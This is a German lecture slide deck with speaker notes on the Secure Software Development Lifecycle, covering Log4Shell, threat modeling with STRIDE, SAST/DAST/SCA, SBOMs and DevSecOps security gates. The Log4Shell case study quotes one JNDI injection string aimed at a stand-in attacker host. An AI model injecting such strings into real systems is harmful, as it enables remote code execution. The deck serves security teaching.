---
marp: true
theme: custom
paginate: false
html: true
footer: ![w:280](img/dhbw-ka.svg)
title: Secure Software Development Lifecycle
---

<!-- _class: title -->
# Secure Software Development Lifecycle

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

### Wie Sicherheit in den Code kommt


<!-- _notes:
Dieser Abschnitt behandelt Wie Sicherheit in den Code kommt. Die folgenden Beispiele zeigen, wie sich das Thema auf konkrete Sicherheitsentscheidungen anwenden lässt. Zur Vorbereitung ist wichtig, die verwendeten Begriffe an einem eigenen Beispiel erklären zu können.
-->
---
<!-- _class: biglist -->
# Agenda

- **Log4Shell** – Der Tag, an dem das Internet brannte
- **Grundlagen** – Vom SDLC zum SSDLC, Shift Left
- **Planung** – Security Requirements, Abuse Cases, Compliance
- **Design** – Security by Design, Threat Modeling, STRIDE
- **Testing** – SAST, DAST, SCA, Code Review, Fuzzing
- **Supply Chain** – Angriffsflächen & Software Bill of Materials (SBOM)
- **DevSecOps** – CI/CD-Integration & Security Gates

<!-- _notes:
Danach bauen wir Schritt für Schritt den Secure Software Development Lifecycle auf, entlang der klassischen Phasen Planung, Design, Implementierung, Testing. Zum Schluss schauen wir über den eigenen Code hinaus: Supply Chain und DevSecOps. Roter Faden: Sicherheit ist kein Feature am Ende, sondern eine Frage in jeder Phase.
-->

---
<!-- _class: chapter -->
# Log4Shell

## Der Tag, an dem das Internet brannte


<!-- _notes:
Dieser Abschnitt behandelt Der Tag, an dem das Internet brannte. Die folgenden Beispiele zeigen, wie sich das Thema auf konkrete Sicherheitsentscheidungen anwenden lässt. Zur Vorbereitung ist wichtig, die verwendeten Begriffe an einem eigenen Beispiel erklären zu können.
-->
---
# Fallstudie: Log4Shell (Dezember 2021)

- **Was geschah?**
  - Kritische Schwachstelle in **Log4j**, einer der meistgenutzten Java-Logging-Bibliotheken
  - Ein einziger String in einer Log-Nachricht (`${jndi:ldap://angreifer.de/x}`) reichte, um beliebigen Code auf dem Server auszuführen
  - Betroffen: Minecraft, Apple iCloud, Amazon, Cloudflare, unzählige Firmen weltweit

- **CVSS-Score: 10.0 von 10** – der höchstmögliche Schweregrad

<!-- _notes:
Log4Shell (CVE-2021-44228) zeigt beispielhaft, wie eine winzige Design-Entscheidung in einer einzelnen Bibliothek globale Auswirkungen haben kann. Log4j wird von Millionen Java-Anwendungen eingesetzt, oft tief verschachtelt als Abhängigkeit einer Abhängigkeit. Betont: Man musste diese Bibliothek nicht mal direkt einsetzen, um verwundbar zu sein. Das leitet direkt zum Supply-Chain-Kapitel später über.
-->

---
# Warum konnte das passieren?

- **Technische Ursache**: Log4j konnte Log-Nachrichten automatisch als **JNDI-Lookup** (Java Naming and Directory Interface) interpretieren und externen Code nachladen
  - Ein Feature, kein Bug – aber ohne Absicherung gegen fremde Eingaben gebaut

- **Prozess-Ursache**: Niemand hatte im Design gefragt „Was, wenn ein Angreifer diesen String selbst einschleust?"
  - Kein Threat Modeling, keine Abuse-Case-Betrachtung für diese Funktion

> **Merksatz:** Log4Shell war kein Coding-Fehler im klassischen Sinn – es war ein Versagen im *Design*.

<!-- _notes:
Das ist die perfekte Wichtige Differenzierung für die Vorlesung: Viele denken bei Schwachstellen zuerst an "schlechten Code". Hier war der Code sogar "wie spezifiziert" – das Problem lag eine Ebene höher, in der Design-Entscheidung, Nutzereingaben ungefiltert in eine mächtige Funktion (JNDI-Lookup) fließen zu lassen.
-->

---
# Konsequenzen & Lehren

- **Kosten**: Wochenlange Notfall-Patches weltweit, geschätzte Milliardenschäden durch Ausfallzeiten und Incident Response

- **Regulatorisch**: Behörden (u. a. CISA in den USA) gaben Notfallanweisungen heraus

- **Lehren für heute:**
  - Sicherheit muss **vor** dem ersten Zeilen-Code mitgedacht werden
  - Abhängigkeiten (auch tief verschachtelte) sind Teil der eigenen Angriffsfläche
  - Ohne **Software Bill of Materials (SBOM)** wussten viele Firmen tagelang nicht, ob sie überhaupt betroffen waren

<!-- _notes:
"Sicherheit vorher mitdenken" führt zu SSDLC/Shift Left, "Abhängigkeiten als Angriffsfläche" zu Supply Chain, "SBOM" wird dort im Detail erklärt.
-->

---
<!-- _class: chapter -->
# Grundlagen

## Vom SDLC zum SSDLC


<!-- _notes:
Dieser Abschnitt behandelt Vom SDLC zum SSDLC. Die folgenden Beispiele zeigen, wie sich das Thema auf konkrete Sicherheitsentscheidungen anwenden lässt. Zur Vorbereitung ist wichtig, die verwendeten Begriffe an einem eigenen Beispiel erklären zu können.
-->
---
# Software Development Lifecycle (SDLC)

- **Software Development Lifecycle (SDLC)**: strukturierter Prozess zur Entwicklung von Software in klar abgegrenzten Phasen

- Klassische Phasen:
  - **Planung** → **Design** → **Implementierung** → **Testing** → **Deployment** → **Wartung**

- Ziel: Qualität, Termintreue, nachvollziehbare Entwicklung

- Sicherheit kommt in dieser klassischen Sicht **nicht** als eigene Phase vor

<!-- _notes:
Wichtig ist der letzte Punkt: In der klassischen Definition taucht Security nirgends explizit auf. Das ist die Ausgangslage, die wir jetzt korrigieren.
-->

---
# Das Problem: Security als Nachgedanke

- Traditionell wurde Sicherheit oft erst **am Ende** geprüft – z. B. kurz vor dem Release durch einen Penetrationstest

- Folge: Schwachstellen werden erst spät entdeckt, wenn Architektur und Code bereits feststehen

- Nachträgliches Beheben bedeutet oft: Code umschreiben, Architektur anpassen, Release verschieben

> **Merksatz:** Security als letzter Schritt ist wie ein Airbag, den man erst nach dem Unfall einbaut.

<!-- _notes:
Diese Analogie soll sitzen bleiben: Ein Airbag, der nach dem Crash eingebaut wird, nützt nichts – genauso wenig wie ein Pentest, der erst nach der fertigen Architektur stattfindet und dann grundlegende Design-Fehler aufdeckt.
-->

---
# Was kostet ein später Fund?

![w:1220 center](img/ssdlc-cost-curve.svg)

> **Kernaussage:** Spät gefundene Sicherheitsprobleme können Änderungen an bereits festgelegter Architektur und implementiertem Code erfordern.

<!-- _notes:
Ein spät entdeckter Fehler kann bereits getroffene Architekturentscheidungen, implementierten Code und Tests betreffen. Deshalb ist eine frühe Prüfung hilfreich, auch wenn sie spätere Sicherheitstests nicht ersetzt. Die Kostenkurve verdeutlicht diesen Zusammenhang; sie ist keine allgemeingültige Preisformel.
-->

---
# Secure Software Development Lifecycle (SSDLC)

- **Secure SDLC (SSDLC)**: Erweiterung des klassischen SDLC, bei der Sicherheitsaktivitäten in **jede** Phase integriert werden – nicht nur am Ende

- Kein Ersatz für den SDLC, sondern eine **Sicherheitsschicht** über allen Phasen

- Jede Phase bekommt eigene Sicherheitsaufgaben:
  - Planung → Security Requirements
  - Design → Threat Modeling
  - Implementierung → Secure Coding
  - Testing → SAST/DAST/SCA
  - Deployment/Wartung → Monitoring, Patch-Management

> **Umsetzung:** Auch bei der Implementierung gelten sichere Voreinstellungen, Eingabeprüfung und Schutz von Zugangsdaten; die folgenden Kapitel vertiefen vor allem Planung, Design und Prüfung.

<!-- _notes:
Das ist die zentrale Definition der heutigen Vorlesung – gerne wörtlich mitschreiben lassen. SSDLC ersetzt nicht die bekannten Phasen, sondern reichert jede einzelne mit einer Sicherheitsaktivität an. Die Liste am Ende ist quasi das Inhaltsverzeichnis der nächsten vier Kapitel – Planung, Design, Implementierung, Testing greifen das jeweils im Detail auf.
-->

---
# Shift Left

- **Shift Left**: Sicherheitsprüfungen so früh wie möglich im Entwicklungsprozess durchführen – zeitlich "nach links" auf der Zeitachse verschoben

![w:980 center](img/shift-left.svg)

<!-- _notes:
Der Begriff "Shift Left" kommt daher, dass man Prozess-Zeitachsen üblicherweise von links (früh) nach rechts (spät) zeichnet – Sicherheit wird also nach links, also früher, verschoben. Shift Left heißt nicht "Testing am Ende weglassen", sondern zusätzlich früher ansetzen. Die spätere Prüfung bleibt als Netz bestehen, aber die meisten Fehler sollen schon vorher abgefangen werden. Kurze Analogie: Rechtschreibprüfung während des Tippens statt erst beim Korrekturlesen des fertigen Buchs.
-->

---
# Zusammenfassung: SDLC vs. SSDLC

| Aspekt | SDLC (klassisch) | SSDLC |
|---|---|---|
| Sicherheit | Am Ende, oft nur Pentest | In jeder Phase |
| Kosten von Fehlern | Hoch (spät entdeckt) | Niedriger (früh entdeckt) |
| Verantwortung | Meist nur Security-Team | Gesamtes Entwicklungsteam |
| Denkweise | "Security testen" | "Security by Design" |

<!-- _notes:
Diese Tabelle fasst das Kapitel zusammen und dient gleichzeitig als Brücke: "Security by Design" ist der Titel unseres nächsten Kapitels. Kurz erwähnen, dass "Verantwortung beim gesamten Team" später im DevSecOps-Kapitel nochmal vertieft wird.
-->

---
<!-- _class: chapter -->
# Planung

## Security Requirements, Abuse Cases, Compliance


<!-- _notes:
Dieser Abschnitt behandelt Security Requirements, Abuse Cases, Compliance. Die folgenden Beispiele zeigen, wie sich das Thema auf konkrete Sicherheitsentscheidungen anwenden lässt. Zur Vorbereitung ist wichtig, die verwendeten Begriffe an einem eigenen Beispiel erklären zu können.
-->
---
# Security Requirements

- **Security Requirements**: Anforderungen an ein System, die sich nicht auf Funktionalität, sondern auf Schutzziele beziehen

- Zwei Arten:
  - **Funktionale Security-Anforderungen**: „Passwörter müssen gehasht gespeichert werden"
  - **Nicht-funktionale Security-Anforderungen**: „Das System muss 99,9 % der Login-Versuche in unter 1 Sekunde verarbeiten – auch unter Last durch Credential-Stuffing"

- Werden idealerweise **gemeinsam** mit den fachlichen Anforderungen erhoben – nicht nachträglich ergänzt

> **Sicherheitszweck des Lastbeispiels:** Automatisierte Anmeldeversuche sollen den Dienst nicht unbenutzbar machen. Die Latenz ist nur eine messbare Anforderung dafür.

<!-- _notes:
Wichtig ist die Unterscheidung funktional/nicht-funktional, weil Security oft in beide Kategorien fällt. Beispiel gut erklären: "Passwort hashen" ist eine klare funktionale Anforderung, die man testen kann; "robust gegen Angriffe X" ist eher eine Qualitätseigenschaft.
-->

---
# Abuse Cases vs. Use Cases

- **Use Case**: beschreibt, wie ein System **bestimmungsgemäß** genutzt wird
  - Beispiel: „Nutzer meldet sich mit Benutzername und Passwort an"

- **Abuse Case**: beschreibt, wie ein System **missbräuchlich** genutzt werden könnte
  - Beispiel: „Angreifer probiert automatisiert tausende Passwörter durch (Credential Stuffing)"

- Für jeden kritischen Use Case sollte mindestens ein passender Abuse Case erhoben werden

> **Merksatz:** Ein Use Case beschreibt den Helden der Geschichte – ein Abuse Case den Bösewicht.

<!-- _notes:
Abuse Cases sind im Grunde die "Denk wie ein Angreifer"-Übung, aber schon in der Planungsphase, lange bevor Code existiert. Das Beispiel Login/Credential-Stuffing bewusst wählen, weil es später bei IAM (letzte Vorlesung) schon angerissen wurde – guter Anknüpfungspunkt. Betonen: Abuse Cases führen direkt zu konkreten Security Requirements, z. B. "nach 5 Fehlversuchen Account sperren oder Rate-Limit einführen".
-->

---
# Compliance als Treiber

- Viele Security Requirements entstehen nicht freiwillig, sondern durch **rechtliche und regulatorische Vorgaben**

- Wichtige Rahmenwerke:
  - **Datenschutz-Grundverordnung (DSGVO)**: Schutz personenbezogener Daten, „Privacy by Design"
  - **ISO/IEC 27001**: internationaler Standard für Informationssicherheits-Managementsysteme
  - **NIST Secure Software Development Framework (SSDF)**: konkrete Praktiken für sichere Entwicklung, in den USA zunehmend Pflicht für Software-Lieferanten des Staates

- Compliance ist kein Ersatz für echte Sicherheit – aber oft der Auslöser dafür, überhaupt damit anzufangen

<!-- _notes:
Wichtig ist die Einordnung am Ende: Compliance-Checklisten abzuhaken bedeutet nicht automatisch sichere Software, aber in der Praxis ist Compliance-Druck (Audits, Bußgelder, Kundenanforderungen) oft der eigentliche Grund, warum Unternehmen SSDLC überhaupt einführen. NIST SSDF kann als Ausblick auf die praktische Umsetzung späterer Kapitel dienen.
-->

---
<!-- _class: chapter -->
# Design

## Security by Design, Threat Modeling, STRIDE


<!-- _notes:
Dieser Abschnitt behandelt Security by Design, Threat Modeling, STRIDE. Die folgenden Beispiele zeigen, wie sich das Thema auf konkrete Sicherheitsentscheidungen anwenden lässt. Zur Vorbereitung ist wichtig, die verwendeten Begriffe an einem eigenen Beispiel erklären zu können.
-->
---
# Security by Design

- **Security by Design**: Sicherheit wird als Grundprinzip der Architektur behandelt, nicht als nachträgliche Ergänzung

- Wichtige Leitprinzipien:
  - **Minimalprinzip (Least Privilege)**: Jede Komponente bekommt nur die Rechte, die sie zwingend braucht
  - **Fail Secure**: Bei einem Fehler soll das System in einen sicheren Zustand fallen (z. B. Zugriff verweigern statt gewähren)
  - **Defense in Depth**: Mehrere Sicherheitsschichten, damit der Ausfall einer Schicht nicht sofort zum Totalschaden führt

<!-- _notes:
Least Privilege begrenzt die Rechte jeder Komponente auf das Notwendige. Fail Secure bedeutet, dass bei einem Fehler keine zusätzlichen Berechtigungen entstehen; ein fehlgeschlagener Berechtigungscheck darf nicht automatisch Zugriff gewähren. Defense in Depth kombiniert mehrere voneinander unabhängige Kontrollen.
-->

---
# Threat Modeling

- **Threat Modeling**: systematische Methode, um mögliche Bedrohungen für ein System **vor** der Implementierung zu identifizieren

- Klassischer Ablauf:
  1. System modellieren (Datenflussdiagramm: wer spricht mit wem?)
  2. Bedrohungen pro Komponente identifizieren
  3. Bedrohungen bewerten (Risiko = Wahrscheinlichkeit × Schaden)
  4. Gegenmaßnahmen definieren

- Wird typischerweise vom Entwicklungsteam gemeinsam mit Security-Experten durchgeführt

> **Übung:** Ein fremder Text erreicht den Logging-Dienst. Welche STRIDE-Kategorien wären betroffen, wenn daraus eine externe Anfrage oder Codeausführung entsteht?

<!-- _notes:
Threat Modeling ist die konkrete Methode, mit der man Design-Fehler wie bei Log4Shell hätte vorher erkennen können. Der vierstufige Ablauf ist der rote Faden – besonders Schritt 1 (Datenflussdiagramm) sollte kurz mit einem einfachen Beispiel visualisiert werden: Client → API → Datenbank, wo an jedem Pfeil Bedrohungen entstehen können. Ein Datenflussdiagramm zeigt Komponenten und Vertrauensgrenzen; an jeder Grenze werden mögliche Angriffe und Gegenmaßnahmen betrachtet.
-->

---
# STRIDE – Eine Bedrohungs-Taxonomie

| Buchstabe | Bedrohung | Verletztes Schutzziel |
|---|---|---|
| **S**poofing | Vortäuschen einer falschen Identität | Authentizität |
| **T**ampering | Unbefugte Veränderung von Daten | Integrität |
| **R**epudiation | Abstreiten einer durchgeführten Aktion | Nicht-Abstreitbarkeit |
| **I**nformation Disclosure | Ungewollte Preisgabe von Daten | Vertraulichkeit |
| **D**enial of Service | Verfügbarkeit wird beeinträchtigt | Verfügbarkeit |
| **E**levation of Privilege | Unbefugte Rechteausweitung | Autorisierung |

<!-- _notes:
Für jede Zeile kurz ein Mini-Beispiel griffbereit haben: Spoofing = gefälschte Absenderadresse, Tampering = manipulierter Kaufpreis in einer URL, Repudiation = Nutzer bestreitet eine Transaktion ohne Log, Information Disclosure = Fehlermeldung verrät Datenbankstruktur, DoS = Server mit Anfragen überflutet, Elevation of Privilege = normaler Nutzer wird zum Admin.
-->

---
# STRIDE am Beispiel: Log4Shell

- **Information Disclosure**: Angreifer konnte interne Umgebungsvariablen und Secrets auslesen

- **Elevation of Privilege**: Durch Remote Code Execution erlangte der Angreifer volle Kontrolle über den Server-Prozess

- Ein systematisches Threat Modeling mit STRIDE hätte die Frage aufgeworfen: „Was passiert, wenn eine Log-Nachricht selbst ausführbaren Code enthält?"

<!-- _notes:
Betonen: STRIDE ist kein Selbstzweck, sondern hätte hier ganz konkret zur richtigen Frage geführt.
-->



---
<!-- _class: chapter -->
# Testing

## SAST, DAST, SCA, Code Review, Fuzzing


<!-- _notes:
Dieser Abschnitt behandelt SAST, DAST, SCA, Code Review, Fuzzing. Die folgenden Beispiele zeigen, wie sich das Thema auf konkrete Sicherheitsentscheidungen anwenden lässt. Zur Vorbereitung ist wichtig, die verwendeten Begriffe an einem eigenen Beispiel erklären zu können.
-->
---
<!-- _class: normal -->
# SAST vs. DAST

<div class="columns">
<div>

### Static Application Security Testing (SAST)
- Analysiert den **Quellcode**, ohne ihn auszuführen
- Findet z. B. Injection-Muster, unsichere Funktionen
- Früh im Prozess einsetzbar (schon beim Commit)
- Nachteil: viele **False Positives**

</div>
<div>

### Dynamic Application Security Testing (DAST)
- Testet die **laufende Anwendung** von außen
- Findet z. B. echte XSS-Lücken im Browser-Kontext
- Braucht eine lauffähige Umgebung
- Nachteil: findet Fehler erst spät (nach dem Build)

</div>
</div>

> **XSS (Cross-Site Scripting):** Angreifer bringen ausführbaren Inhalt in eine Webanwendung ein, der im Browser anderer Nutzer verarbeitet wird.

<!-- _notes:
Diese Gegenüberstellung ist zentral für das Testing-Kapitel. Analogie anbieten: SAST liest den Bauplan eines Hauses und sucht Konstruktionsfehler, DAST geht tatsächlich durchs fertige Haus und rüttelt an Türen und Fenstern. Beide ergänzen sich – SAST ist "Shift Left"-freundlicher, DAST findet dafür Dinge, die erst zur Laufzeit sichtbar werden (z. B. Fehlkonfigurationen des Servers). SAST untersucht Quellcode, DAST die laufende Anwendung und SCA die eingesetzten Fremdkomponenten.
-->

---
# Software Composition Analysis (SCA)

- **Software Composition Analysis (SCA)**: automatisierte Prüfung aller verwendeten Open-Source-Abhängigkeiten auf bekannte Schwachstellen

- Gleicht eingesetzte Bibliotheken (inkl. transitiver Abhängigkeiten) mit Schwachstellen-Datenbanken ab (z. B. **CVE**-Einträge)

- **Log4Shell-Bezug**: Ein SCA-Tool hätte sofort gemeldet: „Log4j Version X ist verwundbar – Update auf Version Y nötig"

<!-- _notes:
SCA ist die Testing-Antwort auf das Supply-Chain-Problem, das im Log4Shell-Beispiel und im nächsten Kapitel vertieft wird. SCA prüft nicht den eigenen Code, sondern die Fremdanteile – bei modernen Anwendungen oft 70-90% des Codes. CVE (Common Vulnerabilities and Exposures) kurz als "öffentliche, eindeutige ID für eine bekannte Schwachstelle" einordnen, falls der Begriff noch nicht bekannt ist.
-->

---
# Code Review & Fuzzing

- **Code Review**: manuelle (oder teilautomatisierte) Durchsicht von Code-Änderungen durch andere Entwickler vor der Übernahme
  - Findet auch subtile Logikfehler, die Tools übersehen
  - Fördert Wissenstransfer im Team

- **Fuzzing**: automatisiertes Testen mit massenhaft zufälligen oder mutierten Eingaben, um Abstürze und unerwartetes Verhalten zu provozieren
  - Besonders wirksam bei Parsern, Datei-Formaten, Netzwerkprotokollen

<!-- _notes:
Code Review ist die "menschliche" Ergänzung zu den automatisierten Tools davor – bewusst betonen, dass Tools Muster erkennen, aber Kontext (z. B. "warum wird hier überhaupt personenbezogene Daten geloggt?") oft nur ein Mensch einordnen kann. Fuzzing kurz mit einem Bild erklären: Ein Programm bekommt tausende leicht kaputte Eingaben vorgeworfen, um zu sehen, ob es abstürzt oder sich falsch verhält – so wurden z. B. viele Heartbleed-ähnliche Parser-Bugs gefunden.
-->

---
# Testing-Werkzeuge im Überblick

| Methode | Prüft | Zeitpunkt | Beispielfund |
|---|---|---|---|
| SAST | Quellcode | Sehr früh | Fest codiertes Passwort |
| DAST | Laufende App | Spät | XSS im Login-Formular |
| SCA | Abhängigkeiten | Früh/laufend | Verwundbare Log4j-Version |
| Code Review | Logik & Kontext | Vor Merge | Fehlende Rechteprüfung |
| Fuzzing | Robustheit | Vor Release | Absturz bei Datei-Upload |

<!-- _notes:
Diese Tabelle fasst das Kapitel zusammen und dient als Lernhilfe – die Spalte "Zeitpunkt" zeigt nochmal konkret, wie unterschiedlich früh/spät die Methoden im Prozess ansetzen, was den Shift-Left-Gedanken untermauert.
-->

---
<!-- _class: chapter -->
# Supply Chain

## Angriffsflächen & Software Bill of Materials (SBOM)


<!-- _notes:
Dieser Abschnitt behandelt Angriffsflächen & Software Bill of Materials (SBOM). Die folgenden Beispiele zeigen, wie sich das Thema auf konkrete Sicherheitsentscheidungen anwenden lässt. Zur Vorbereitung ist wichtig, die verwendeten Begriffe an einem eigenen Beispiel erklären zu können.
-->
---
# Die Software-Lieferkette als Angriffsfläche

- **Software Supply Chain**: alle Komponenten, Werkzeuge und Prozesse, die zur Entstehung einer Software beitragen – nicht nur der eigene Code

- Typische Glieder: Open-Source-Bibliotheken, Build-Tools, CI/CD-Infrastruktur, Container-Images, Entwickler-Rechner

- Angreifer zielen zunehmend nicht auf das Endprodukt, sondern auf **ein Glied der Kette**, um viele Opfer gleichzeitig zu treffen

<!-- _notes:
Log4Shell war bereits ein Supply-Chain-Thema (verwundbare Abhängigkeit), hier wird das systematisch eingeordnet. Die Kette ist oft länger als gedacht – eine Anwendung nutzt Bibliotheken, die selbst wieder Bibliotheken nutzen. Der Vorteil für Angreifer: Ein Kompromittieren eines einzigen populären Pakets kann tausende Anwendungen gleichzeitig treffen – viel effizienter als einzelne Ziele anzugreifen.
-->

---
# Fallstudie: SolarWinds (2020)

- **Was geschah?**
  - Angreifer kompromittierten die Build-Infrastruktur des Netzwerk-Management-Tools „Orion"
  - Schadcode wurde in ein offizielles, digital signiertes Update eingeschleust
  - ~18.000 Kunden installierten das manipulierte Update, darunter US-Behörden und Großkonzerne

- **Warum Supply-Chain-Versagen?**
  - Vertrauen in den Update-Mechanismus wurde ausgenutzt – niemand prüfte das signierte Update inhaltlich

- **Konsequenzen:** Monatelange, teils bis heute andauernde Aufarbeitung; einer der folgenreichsten Cyberangriffe überhaupt

> **Einordnung:** SPDX und CycloneDX sind Beispiele für maschinenlesbare SBOM-Formate; wichtiger als ihre Namen ist die nachvollziehbare Liste von Komponenten und Versionen.

<!-- _notes:
SolarWinds zeigt eine andere Angriffsvariante als Log4Shell: nicht eine offene Schwachstelle in einer Bibliothek, sondern ein gezielter Angriff auf die Build-Pipeline des Herstellers selbst. Betonen: Digitale Signaturen bestätigen nur "kommt vom richtigen Absender", nicht "der Inhalt ist unschädlich" – wenn der Absender selbst kompromittiert ist, hilft die Signatur nicht. Guter Vergleichspunkt zu Log4Shell: dort war die Schwachstelle öffentlich in einer offenen Bibliothek, hier ein gezielter, verdeckter Angriff auf einen einzelnen Hersteller.
-->

---
# Software Bill of Materials (SBOM)

- **Software Bill of Materials (SBOM)**: maschinenlesbares Verzeichnis aller Komponenten, Bibliotheken und deren Versionen, die in einer Software stecken

- Vergleichbar mit der Zutatenliste auf einer Lebensmittelverpackung

- Nutzen:
  - Bei neuer Schwachstelle (wie Log4Shell) sofort prüfbar: „Sind wir betroffen?"
  - Voraussetzung für viele Compliance-Vorgaben (z. B. US-Behörden verlangen SBOMs von Zulieferern)

- Verbreitete Formate: **SPDX**, **CycloneDX**

<!-- _notes:
Die Lebensmittel-Analogie ist eingängig: So wie man bei einer Allergie-Warnung sofort auf der Verpackung nachschauen kann, ob ein Inhaltsstoff enthalten ist, erlaubt eine SBOM die sofortige Prüfung bei neu bekannt gewordenen Schwachstellen. Rückbezug zu Log4Shell: Firmen mit vorhandener SBOM konnten die Frage "sind wir betroffen?" in Minuten statt Tagen beantworten. SPDX und CycloneDX nur kurz als Namen der gängigsten Standardformate nennen, keine Vertiefung nötig.
-->

---
<!-- _class: chapter -->
# DevSecOps

## CI/CD-Integration & Security Gates


<!-- _notes:
Dieser Abschnitt behandelt CI/CD-Integration & Security Gates. Die folgenden Beispiele zeigen, wie sich das Thema auf konkrete Sicherheitsentscheidungen anwenden lässt. Zur Vorbereitung ist wichtig, die verwendeten Begriffe an einem eigenen Beispiel erklären zu können.
-->
---
# Von DevOps zu DevSecOps

- **DevOps**: Kultur und Praktiken, die Entwicklung (Dev) und Betrieb (Ops) enger verzahnen – häufige, automatisierte Releases

- **DevSecOps**: Erweiterung von DevOps, bei der Security als gleichberechtigter Bestandteil in jeden Schritt der Pipeline integriert wird

- Kernidee: Sicherheit ist **Aufgabe des gesamten Teams**, nicht nur eines separaten Security-Teams am Ende

<!-- _notes:
DevSecOps ist die organisatorische und werkzeugtechnische Umsetzung von allem, was in dieser Vorlesung bisher besprochen wurde – Shift Left, SAST/DAST/SCA, Security Requirements. Betonen: Das "Sec" steht bewusst in der Mitte des Wortes, nicht am Ende – Symbol dafür, dass Security kein letzter Schritt, sondern Teil des gesamten Flusses ist.
-->

---
# CI/CD-Pipeline mit Security Gates

![w:1260 center](img/cicd-security-gates.svg)

<!-- _notes:
Diese Pipeline ist die praktische Zusammenfassung der gesamten Vorlesung: SAST direkt nach dem Commit, SCA beim Build (Abhängigkeiten prüfen), DAST gegen die Staging-Umgebung, Secret Scanning durchgehend. Ein "Security Gate" bedeutet: Der Build wird automatisch gestoppt, wenn eine kritische Schwachstelle gefunden wird – das Team kann also gar nicht versehentlich unsicheren Code in Produktion bringen. Wichtig zu erwähnen: Gates müssen sinnvoll kalibriert sein, sonst blockieren zu viele False Positives jeden Release und Teams schalten die Prüfung frustriert ab.
-->

---
# Security Gates richtig einsetzen

- **Security Gate**: automatisierter Kontrollpunkt in der Pipeline, der den weiteren Ablauf stoppt, wenn definierte Kriterien nicht erfüllt sind

- Beispiele für Gate-Kriterien:
  - Keine Schwachstelle mit CVSS ≥ 9.0 in Abhängigkeiten
  - Keine gefundenen Secrets im Commit
  - SAST-Scan ohne kritische Findings

- Balance nötig: zu strenge Gates bremsen Teams aus, zu lasche Gates verfehlen ihren Zweck

> **Beispiel für eine Ausnahme:** Kritischer Fund vor dem Release → Risiko dokumentieren, zuständige Stelle entscheidet, begrenzte Ausnahme und Nacharbeit festlegen.

<!-- _notes:
In der Praxis braucht es einen definierten Ausnahmeprozess (z. B. Risiko bewusst akzeptieren, dokumentiert von einer verantwortlichen Person) statt das Gate einfach zu deaktivieren. Das zeigt, dass DevSecOps auch eine organisatorische, nicht nur technische Frage ist.
-->

---
# DevSecOps-Kultur

- Technische Tools allein reichen nicht – DevSecOps braucht auch:
  - **Security Champions**: Entwickler mit zusätzlichem Sicherheitswissen als Ansprechpartner im Team
  - **Schulungen**: Secure-Coding-Trainings statt einmaliger Kick-off-Veranstaltung
  - **Blameless Culture**: Schwachstellen melden, ohne Angst vor Schuldzuweisung

> **Merksatz:** DevSecOps ist zu 20 % Werkzeug und zu 80 % Kultur.

<!-- _notes:
Betonen: Die besten SAST/DAST-Tools nützen nichts, wenn Findings ignoriert werden, weil niemand Zeit oder Verantwortung dafür hat. Security Champions sind ein in der Praxis sehr verbreitetes Modell in dualen Partnerunternehmen – ggf.
-->

---
# Zurück zu Log4Shell: Was hätte geholfen?
<!-- _class: small -->
| SSDLC-Phase | Maßnahme | Hätte geholfen bei Log4Shell? |
|---|---|---|
| Design | Threat Modeling (STRIDE) | Risiko des JNDI-Lookups wäre aufgefallen |
| Implementierung | Sichere Standardkonfiguration | Feature standardmäßig deaktiviert |
| Testing | SCA | Verwundbare Version wäre markiert worden |
| Supply Chain | SBOM | Betroffenheit in Minuten statt Tagen klar |
| DevSecOps | Security Gate | Automatisches Update-Signal in der Pipeline |

> **Implementierung gehört dazu:** Eingaben prüfen, Geheimnisse schützen und sichere Standardkonfigurationen wählen; Prüfwerkzeuge ersetzen diese Arbeit nicht.

<!-- _notes:
Jede Zeile verweist auf ein Kapitel der heutigen Vorlesung – gut geeignet, um am Ende nochmal den gesamten roten Faden zusammenzufassen, ohne neuen Stoff einzuführen.
-->

---
# Zusammenfassung

| Phase | Sicherheitsaktivität |
|---|---|
| Planung | Security Requirements, Abuse Cases, Compliance |
| Design | Security by Design, Threat Modeling, STRIDE |
| Implementierung | Secure Coding (OWASP Top 10), Secrets Management |
| Testing | SAST, DAST, SCA, Code Review, Fuzzing |
| Supply Chain | SBOM, Absicherung der Abhängigkeiten |
| Betrieb | CI/CD mit Security Gates, Monitoring |

> **Merksatz:** Sicherheit ist kein Zustand am Ende, sondern eine Aktivität in jeder Phase.

<!-- _notes:
Diese Tabelle ist die zentrale Lernhilfe der Vorlesung – jede Zeile korrespondiert mit einem Kapitel. Gut geeignet, um am Ende nochmal durchzugehen und offene Fragen zu sammeln.
-->

---
# Diskussionsfragen

- In welcher Phase des SSDLC seht ihr in eurem dualen Partnerunternehmen die größten Lücken?
- Wäre ein strenges Security Gate in eurem Unternehmen durchsetzbar – oder würde es umgangen werden?
- Log4Shell entstand durch ein "Feature ohne Absicherung" – kennt ihr ähnliche Fälle aus eigener Erfahrung?

<!-- _notes:
Diskussionsfragen ist ein Baustein der IT-Sicherheit. Entscheidend ist, welches Risiko angesprochen wird und welche Maßnahme seine Auswirkungen begrenzt.
-->
